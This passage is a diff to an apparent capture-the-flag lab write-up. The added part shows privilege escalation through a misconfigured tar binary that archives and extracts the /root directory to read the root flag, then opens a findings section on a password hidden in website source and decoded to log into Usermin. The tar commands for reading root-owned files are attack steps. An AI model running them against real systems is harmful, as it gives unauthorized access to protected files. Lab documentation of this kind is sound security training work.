@@ -205,6 +205,7 @@ Using **tar**, root files were archived, and their contents were when read.
 **Commands:**
 
 /home/cyber/tar -cf /tmp/root-files.tar /root
+
 /home/cyber/tar -tvf /tmp/root-files.tar
 
 **Results:** Access to the contents of the **/root** directory was obtained.
@@ -212,3 +213,32 @@ Using **tar**, root files were archived, and their contents were when read.
 **Evidence:** List of files in the archive.
 
 <img width="629" height="298" alt="image" src="https://github.com/user-attachments/assets/b46ef52b-73fb-441e-b871-6d22e3255424" />
+
+## 8.2 Reading the Root Flag
+
+A target directory was created, and the files were extracted from the archive.
+
+**Commands:**
+
+mkdir -p /tmp/rootdata
+
+/home/cyber/tar -xf /tmp/root-files.tar -C /tmp/rootdata
+
+The root flag was then read:
+
+**Command:** cat /tmp/rootdata/root/rOOt.txt
+
+**Result:** The root flag was obtained, confirming full system access.
+
+**Finding:** Privilege escalation through a misconfigured **tar** utility that allowed access to root files.
+
+# 9. Findings and Risk Assessment
+
+The following findings summarize the security weaknesses identified during the assessment. Severity ratings are provisional qualitative assessments based on demonstrated impact in the lab environment; they are not formal CVSS scores.
+
+## F-01: Password Disclosure in Website Source Code
+
+**Suggested severity:** High 
+
+**Description:** The source code of the website on port 80 contained a password encrypted using the Brainfuck algorithm, which, after decryption, enabled authentication to the Usermin application.
+
